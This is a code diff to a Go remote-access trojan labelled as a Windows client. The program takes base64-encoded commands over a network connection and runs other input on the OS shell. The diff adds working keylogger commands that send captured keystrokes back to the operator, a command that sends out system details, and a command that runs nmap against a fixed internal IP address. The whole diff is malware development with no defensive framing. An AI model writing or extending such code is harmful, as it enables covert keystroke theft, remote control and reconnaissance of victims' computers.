@@ -3,11 +3,15 @@ package main
 import (
 	"bufio"
 	"encoding/base64"
+	"github.com/matishsiao/goInfo"
 	"io/ioutil"
+	"kunpeng/keylogger"
+	"kunpeng/service"
 	"log"
 	"net"
 	"os"
 	"os/exec"
+	"strconv"
 )
 
 const (
@@ -18,6 +22,9 @@ const (
 	newLine     string = "\n"
 )
 
+/**
+Windows 客户端
+*/
 func main() {
 	for {
 		Connect()
@@ -40,11 +47,9 @@ func Connect() {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
 		command, _ := bufio.NewReader(conn).ReadString('\n')
-
 		// When the command received are encoded,
 		// decode message received, and test on switch
 		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
-
 		switch string(decodedCommand) {
 
 		case "back":
@@ -55,14 +60,29 @@ func Connect() {
 			conn.Close()
 			os.Exit(0)
 
-
-
 		case "keylogger_start":
-			SendMessage(conn, " [i] Not supported yet!")
+			print("you into keylogger_start")
+			if !keylogger.StartKeyLogger() {
+				print("stepone :keylogger has running!")
+				SendMessage(conn, " keylogger has running!")
+			} else {
+				print("run keylooger")
+				SendMessage(conn, "run keylogger")
+			}
 			RemoveNewLineCharFromConnection(conn)
 
 		case "keylogger_show":
-			SendMessage(conn, " [i] Not supported yet!")
+			if !keylogger.EndKeyLogger() {
+				print("steptwo:keylogger didn't open")
+				SendMessage(conn, "keylogger didn't open")
+			} else {
+				print(keylogger.GetKeyRecording())
+				SendMessage(conn, keylogger.GetKeyRecording())
+			}
+			RemoveNewLineCharFromConnection(conn)
+
+		case "getos":
+			SendMessage(conn, GetOSInformation())
 			RemoveNewLineCharFromConnection(conn)
 
 		case "download":
@@ -82,8 +102,6 @@ func Connect() {
 			if string(decUpload) != "" {
 				ioutil.WriteFile(string(uploadInput), []byte(decUpload), 777)
 			}
-
-
 
 		case "lockscreen":
 			SendMessage(conn, " [i] Not supported yet!")
@@ -115,6 +133,11 @@ func Connect() {
 
 			SendMessage(conn, "[*] Opened!")
 			RemoveNewLineCharFromConnection(conn)
+		case "nmap":
+			print("execute nmap")
+			service.GetNmapInfoFromIp("10.59.13.137")
+			SendMessage(conn, "run nmap")
+			RemoveNewLineCharFromConnection(conn)
 		} // end switch
 
 		SendMessage(conn, RunCmdReturnString(command))
@@ -125,6 +148,18 @@ func Connect() {
 			Connect()
 		}
 	}
+}
+
+func GetOSInformation() string {
+	gi := goInfo.GetInfo()
+	osInformation := "GoOS: " + gi.GoOS
+	osInformation += "\n" + " Kernel: " + gi.Kernel
+	osInformation += "\n" + " Core: " + gi.Core
+	osInformation += "\n" + " Platform: " + gi.Platform
+	osInformation += "\n" + " OS: " + gi.OS
+	osInformation += "\n" + " Hostname: " + gi.Hostname
+	osInformation += "\n" + " CPUs: " + strconv.Itoa(gi.CPUs)
+	return osInformation
 }
 
 func SendMessage(conn net.Conn, message string) {
@@ -175,5 +210,3 @@ func CreateFile(path string, text string) {
 	create.WriteString(text)
 	create.Close()
 }
-
-
